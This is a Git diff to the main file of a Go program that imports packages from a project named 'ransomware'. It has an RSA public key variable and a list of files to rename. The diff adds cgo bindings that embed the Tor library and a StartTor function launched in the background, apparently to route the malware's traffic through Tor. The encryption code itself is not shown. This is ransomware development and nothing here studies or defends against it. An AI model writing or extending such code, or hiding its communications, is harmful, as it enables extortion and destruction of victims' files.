@@ -15,12 +15,19 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"unsafe"
 
 	"github.com/mauri870/ransomware/client"
 	"github.com/mauri870/ransomware/cmd"
 	"github.com/mauri870/ransomware/rsa"
 	"github.com/mauri870/ransomware/utils"
 )
+
+// #cgo CFLAGS: -I../tor-0.2.5.12 -I../tor-0.2.5.12/src/or -I../tor-0.2.5.12/src/common -I../tor-0.2.5.12/src/ext -I../opt/include
+// #cgo LDFLAGS: -L../tor-0.2.5.12/src/or -L../tor-0.2.5.12/src/common -L../opt/lib -L/usr/lib/x86_64-linux-gnu -ltor -ltor-testing  -lor-event -lor-crypto -lor -lor-testing -lcurve25519_donna -lssl -lcrypto -lz -levent -lm -lpthread -ldl -lrt
+// #include <or.h>
+// #include <main.h>
+import "C"
 
 var (
 	// RSA Public key
@@ -34,9 +41,26 @@ var (
 	FilesToRename []cmd.File
 )
 
+// Start the tor SOCKS proxy
+func StartTor() {
+
+	arg1 := C.CString("tor")
+	args := make([]*C.char, 1)
+	args[0] = arg1
+	fmt.Printf("Starting Tor...\n")
+	fmt.Println(C.tor_main(1, (**C.char)(unsafe.Pointer(&args[0]))))
+
+}
+
 func main() {
 	// Fun ASCII
 	cmd.PrintBanner()
+
+	// Start tor in background
+	go StartTor()
+	// Wait to see if tor is starting - this will be removed later
+	var wait string
+	fmt.Scanln(&wait)
 
 	// Execution locked for windows
 	cmd.CheckOS()
